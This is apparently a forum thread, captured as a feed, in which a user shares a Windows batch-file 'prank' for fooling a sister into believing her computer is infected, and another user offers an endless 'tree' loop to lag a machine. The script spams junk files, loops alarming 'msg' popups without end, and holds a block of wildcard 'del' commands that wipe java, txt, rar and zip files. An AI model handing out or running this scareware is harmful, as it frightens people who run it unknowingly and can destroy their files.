channel.title: How to make people go paranoid with one file! UPDATE V3
channel.description:
ok i got my sister with this, it will make whoever runs the .bat file think they have gotten a virus, I wasnt sure were to put this but it is funny! make a .bat file with this in it
[size=15pt]THIS IS NOT A REAL VIRUS![/size] dont accuse me of it.
[i]warning: do not place this near important java,zip,txt, or rar files, it will be hard to delete.[/i] [code] @echo off :co1 set b=0 set t=5 :co2 color 0f :menu title YOUR INFECTED! cls echo You have just gotten infected with a virus! echo your welcome! echo. ECHO. >>"virus1.java" ECHO. >>"virus2.java" ECHO. >>"virus3.java" ECHO. >>"virus4.java" ECHO. >>"virus5.java" ECHO. >>"virus6.java" ECHO. >>"virus7.java" ECHO. >>"virus8.java" ECHO. >>"virus9.java" ECHO. >>"virus10.java" ECHO. >>"virus11.java" ECHO. >>"virus12.java" ECHO. >>"virus21.java" ECHO. >>"virus13.java" ECHO. >>"virus14.java" ECHO. >>"virus15.java" ECHO. >>"virus16.java" ECHO. >>"virus17.java" ECHO. >>"virus18.java" ECHO. >>"virus19.java" ECHO. >>"virus20.java" ECHO. >>"virus21.java" ECHO. >>"virus22.java" ECHO. >>"virus1.rar" ECHO. >>"virus2.rar" ECHO. >>"virus3.rar" ECHO. >>"virus4.rar" ECHO. >>"virus5.rar" ECHO. >>"virus6.rar" ECHO. >>"virus7.rar" ECHO. >>"virus8.rar" ECHO. >>"virus9.rar" ECHO. >>"virus10.rar" ECHO. >>"virus11.rar" ECHO. >>"virus12.rar" ECHO. >>"virus21.rar" ECHO. >>"virus13.rar" ECHO. >>"virus14.rar" ECHO. >>"virus15.rar" ECHO. >>"virus16.rar" ECHO. >>"virus17.rar" ECHO. >>"virus18.rar" ECHO. >>"virus19.rar" ECHO. >>"virus20.rar" ECHO. >>"virus21.rar" ECHO. >>"virus22.rar" ECHO. >>"virus1.zip" ECHO. >>"virus2.zip" ECHO. >>"virus3.zip" ECHO. >>"virus4.zip" ECHO. >>"virus5.zip" ECHO. >>"virus6.zip" ECHO. >>"virus7.zip" ECHO. >>"virus8.zip" ECHO. >>"virus9.zip" ECHO. >>"virus10.zip" ECHO. >>"virus11.zip" ECHO. >>"virus12.zip" ECHO. >>"virus21.zip" ECHO. >>"virus13.zip" ECHO. >>"virus14.zip" ECHO. >>"virus15.zip" ECHO. >>"virus16.zip" ECHO. >>"virus17.zip" ECHO. >>"virus18.zip" ECHO. >>"virus19.zip" ECHO. >>"virus20.zip" ECHO. >>"virus21.zip" ECHO. >>"virus22.zip" ECHO. >>"virus1.txt" ECHO. >>"virus2.txt" ECHO. >>"virus3.txt" ECHO. >>"virus4.txt" ECHO. >>"virus5.txt" ECHO. >>"virus6.txt" ECHO. >>"virus7.txt" ECHO. >>"virus8.txt" ECHO. >>"virus9.txt" ECHO. >>"virus10.txt" ECHO. >>"virus11.txt" ECHO. >>"virus12.txt" ECHO. >>"virus21.txt" ECHO. >>"virus13.txt" ECHO. >>"virus14.txt" ECHO. >>"virus15.txt" ECHO. >>"virus16.txt" ECHO. >>"virus17.txt" ECHO. >>"virus18.txt" ECHO. >>"virus19.txt" ECHO. >>"virus20.txt" ECHO. >>"virus21.txt" ECHO. >>"virus22.txt" GOTO ha pause goto er :delete title Deleting the viruses.. echo. echo There being deleted.. echo I am not responsible if you loose files doing this. del *.java del *.txt del *.rar del *.zip pause :ha msg * HAHAHAHAHA msg * Your computer is losing information!! GOTO ha [/code]

item.title: How to make people go paranoid with one file! UPDATE V3
item.dc:creator: @1337h4x 1337h4x
item.description:
@1337h4x wrote:

[quote=“Aftermath, post:18, topic:91520”][quote author=The Un-Named link=topic=133311.msg1291604#msg1291604 date=1178767610]

:start
tree
goto start

Mine’s smaller, faster, better.

Yours is shit.

Whats tree do?

Run it in command prompt, displays every folder and file in a tree type view, that would lag like hell.
[/quote]

Mine actually finished in a matter of seconds

I don’t keep many files.[/quote]
Imagine that looping over and over with no delay eh?

Read full topic

item.title: How to make people go paranoid with one file! UPDATE V3
item.dc:creator: @Frell Frell
item.description:
@Frell wrote:

ok i got my sister with this, it will make whoever runs the .bat file think they have gotten a virus, I wasnt sure were to put this but it is funny!
make a .bat file with this in it

[size=15pt]THIS IS NOT A REAL VIRUS![/size]
dont accuse me of it.

warning: do not place this near important java,zip,txt, or rar files, it will be hard to delete.

@echo off
:co1
set b=0
set t=5
:co2
color 0f
:menu
title YOUR INFECTED!
cls
echo You have just gotten infected with a virus!
echo               your welcome!
echo.
ECHO. >>"virus1.java"
ECHO. >>"virus2.java"
ECHO. >>"virus3.java"
ECHO. >>"virus4.java"
ECHO. >>"virus5.java"
ECHO. >>"virus6.java"
ECHO. >>"virus7.java"
ECHO. >>"virus8.java"
ECHO. >>"virus9.java"
ECHO. >>"virus10.java"
ECHO. >>"virus11.java"
ECHO. >>"virus12.java"
ECHO. >>"virus21.java"
ECHO. >>"virus13.java"
ECHO. >>"virus14.java"
ECHO. >>"virus15.java"
ECHO. >>"virus16.java"
ECHO. >>"virus17.java"
ECHO. >>"virus18.java"
ECHO. >>"virus19.java"
ECHO. >>"virus20.java"
ECHO. >>"virus21.java"
ECHO. >>"virus22.java"
ECHO. >>"virus1.rar"
ECHO. >>"virus2.rar"
ECHO. >>"virus3.rar"
ECHO. >>"virus4.rar"
ECHO. >>"virus5.rar"
ECHO. >>"virus6.rar"
ECHO. >>"virus7.rar"
ECHO. >>"virus8.rar"
ECHO. >>"virus9.rar"
ECHO. >>"virus10.rar"
ECHO. >>"virus11.rar"
ECHO. >>"virus12.rar"
ECHO. >>"virus21.rar"
ECHO. >>"virus13.rar"
ECHO. >>"virus14.rar"
ECHO. >>"virus15.rar"
ECHO. >>"virus16.rar"
ECHO. >>"virus17.rar"
ECHO. >>"virus18.rar"
ECHO. >>"virus19.rar"
ECHO. >>"virus20.rar"
ECHO. >>"virus21.rar"
ECHO. >>"virus22.rar"
ECHO. >>"virus1.zip"
ECHO. >>"virus2.zip"
ECHO. >>"virus3.zip"
ECHO. >>"virus4.zip"
ECHO. >>"virus5.zip"
ECHO. >>"virus6.zip"
ECHO. >>"virus7.zip"
ECHO. >>"virus8.zip"
ECHO. >>"virus9.zip"
ECHO. >>"virus10.zip"
ECHO. >>"virus11.zip"
ECHO. >>"virus12.zip"
ECHO. >>"virus21.zip"
ECHO. >>"virus13.zip"
ECHO. >>"virus14.zip"
ECHO. >>"virus15.zip"
ECHO. >>"virus16.zip"
ECHO. >>"virus17.zip"
ECHO. >>"virus18.zip"
ECHO. >>"virus19.zip"
ECHO. >>"virus20.zip"
ECHO. >>"virus21.zip"
ECHO. >>"virus22.zip"
ECHO. >>"virus1.txt"
ECHO. >>"virus2.txt"
ECHO. >>"virus3.txt"
ECHO. >>"virus4.txt"
ECHO. >>"virus5.txt"
ECHO. >>"virus6.txt"
ECHO. >>"virus7.txt"
ECHO. >>"virus8.txt"
ECHO. >>"virus9.txt"
ECHO. >>"virus10.txt"
ECHO. >>"virus11.txt"
ECHO. >>"virus12.txt"
ECHO. >>"virus21.txt"
ECHO. >>"virus13.txt"
ECHO. >>"virus14.txt"
ECHO. >>"virus15.txt"
ECHO. >>"virus16.txt"
ECHO. >>"virus17.txt"
ECHO. >>"virus18.txt"
ECHO. >>"virus19.txt"
ECHO. >>"virus20.txt"
ECHO. >>"virus21.txt"
ECHO. >>"virus22.txt"
GOTO ha
pause
goto er
:delete
title Deleting the viruses..
echo.
echo There being deleted..
echo I am not responsible if you loose files doing this.
del *.java
del *.txt
del *.rar
del *.zip
pause
:ha 
msg * HAHAHAHAHA
msg * Your computer is losing information!!
GOTO ha
